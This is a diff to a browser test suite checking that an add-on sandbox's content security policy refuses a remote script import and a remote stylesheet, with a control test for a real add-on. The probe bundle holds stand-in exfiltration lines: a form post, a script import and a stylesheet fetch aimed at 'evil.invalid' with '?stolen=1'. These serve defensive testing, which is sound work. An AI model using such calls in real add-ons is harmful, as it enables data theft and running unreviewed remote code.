@@ -1,5 +1,6 @@
 import { test, expect, type Page } from './support/test';
-import { addOnFrame } from './support/addon';
+import { addOnFrame, installAddOn } from './support/addon';
+import { seedHomeGrid } from './support/homeGrid';
 
 /**
  * What the add-on sandbox actually refuses, in a real browser (MICA-196).
@@ -32,6 +33,14 @@ import { addOnFrame } from './support/addon';
  * is refused alongside the plaintext one. The `data:` image that loads beside them is the
  * control: a policy that refused everything would pass every refusal assertion here while
  * meaning no add-on could draw a picture at all.
+ *
+ * **What the script and stylesheet refusals prove.** `script-src` and `style-src` carried
+ * `https: http:` until MICA-442, so the probe's `import()` of a remote script — code the
+ * pinned bundle's SHA never covered — and its `<link rel="stylesheet">` to a remote host
+ * were both let through to the network. Both are now `'unsafe-inline'` plus `data: blob:`
+ * and the declared `networkHosts`, and both are refused. Their control is the last test in
+ * this file: a real in-tree add-on, whose code and CSS are inline, still boots and draws
+ * its own styles.
  */
 
 /** A fixture add-on's manifest, as `defineApp` needs it. */
@@ -103,6 +112,21 @@ const probeBundle = (id: string) => `
   form.action = 'https://evil.invalid/collect';
   document.body.appendChild(form);
   try { form.submit(); } catch (e) { seen.add('form-blocked-by-sandbox'); render(); }
+
+  // 4. Code the pinned bundle never contained (MICA-442). Under script-src https: this was
+  //    fetched, and would have run had the host answered. The rejection is caught so the
+  //    probe never ends on an unhandled one; the violation event is the evidence, since a
+  //    refused import and an unreachable host reject with the same TypeError.
+  import('https://evil.invalid/payload.js?stolen=1').catch(() => {
+    seen.add('import-rejected');
+    render();
+  });
+
+  // 5. A remote stylesheet: under style-src https: a GET with a query string to any host.
+  const sheet = document.createElement('link');
+  sheet.rel = 'stylesheet';
+  sheet.href = 'https://evil.invalid/theme.css?stolen=1';
+  document.head.appendChild(sheet);
 `;
 
 /**
@@ -141,7 +165,7 @@ test.describe('the add-on sandbox', () => {
     await expect(page.locator('h1', { hasText: 'micaOS' })).toBeVisible();
   });
 
-  test('refuses an image beacon over http and https and a nested remote frame, and survives all three', async ({
+  test('refuses image beacons, a nested remote frame, a remote script and a remote stylesheet, and survives them all', async ({
     page
   }) => {
     await registerAddOn(page, 'sandbox_probe', 'Sandbox Probe', probeBundle('sandbox_probe'));
@@ -159,6 +183,14 @@ test.describe('the add-on sandbox', () => {
     // And a data: image still draws, so the refusal is a scoping and not a blackout.
     await expect(violations).toContainText('data-image-loaded');
     await expect(violations).not.toContainText('data-image-refused');
+    // MICA-442. Chromium reports the element-level sub-directive as the effective one; the
+    // policy declares no `script-src-elem` or `style-src-elem`, so what refused each load
+    // is the `script-src` or `style-src` it falls back to. Under the old `https:` scheme
+    // source neither was refused, and neither string appears.
+    await expect(violations).toContainText('script-src-elem=https://evil.invalid');
+    await expect(violations).toContainText('style-src-elem=https://evil.invalid');
+    // The import was attempted and its rejection handled, so the survival below is real.
+    await expect(violations).toContainText('import-rejected');
 
     /**
      * `form-action` is deliberately not asserted, and finding out why was worth the trip.
@@ -170,7 +202,7 @@ test.describe('the add-on sandbox', () => {
     await expect(violations).not.toContainText('form-action');
 
     // And the add-on is still running: refusing a subresource is not the same event as
-    // stopping the app, and the frame it is refused in has to survive all three attempts.
+    // stopping the app, and the frame it is refused in has to survive every attempt.
     await expect(page.getByText('App Stopped Working')).toBeHidden();
   });
 
@@ -204,5 +236,39 @@ test.describe('the add-on sandbox', () => {
 
     await expect(addOnFrame(page, 'sandbox_settled').locator('#violations')).toBeVisible();
     await expect(page.getByText('App Stopped Working')).toBeHidden();
+  });
+});
+
+/**
+ * The control for the script and stylesheet refusals above (MICA-442).
+ *
+ * A policy that refused every script would pass those assertions while no add-on on the
+ * phone could run, and one that refused every stylesheet would let it run unstyled. So a
+ * real in-tree add-on, built by `web/vite.addon.config.ts` the way every bundled add-on is,
+ * is installed and opened under the same policy, and has to show both its own code running
+ * and its own CSS applied. `notes.spec.ts` already proves the first; the second is what no
+ * spec asserted, because `toBeVisible()` is true of an unstyled `<h1>` too.
+ */
+test.describe('an in-tree add-on under the sandbox policy', () => {
+  test('boots, and draws with its own stylesheet', async ({ page }) => {
+    const refusals: string[] = [];
+    page.on('console', (message) => {
+      if (/Content Security Policy/i.test(message.text())) refusals.push(message.text());
+    });
+    await seedHomeGrid(page, ['store']);
+    await page.goto('/');
+    await installAddOn(page, 'Notes');
+    await page.getByRole('button', { name: /Notes/ }).click();
+
+    // Its own code ran: the title is the add-on's `Screen`, rendered inside the frame.
+    const title = addOnFrame(page, 'notes').locator('h1', { hasText: 'Notes' });
+    await expect(title).toBeVisible();
+    // And its own CSS applied. The bundle injects it as a `<style>`, which `style-src
+    // 'unsafe-inline'` admits; without it this heading falls back to the browser's own
+    // `h1` (weight 700, `text-overflow: clip`), so both values come only from the
+    // `font-semibold` and `truncate` utilities in the injected sheet.
+    await expect(title).toHaveCSS('font-weight', '600');
+    await expect(title).toHaveCSS('text-overflow', 'ellipsis');
+    expect(refusals).toEqual([]);
   });
 });
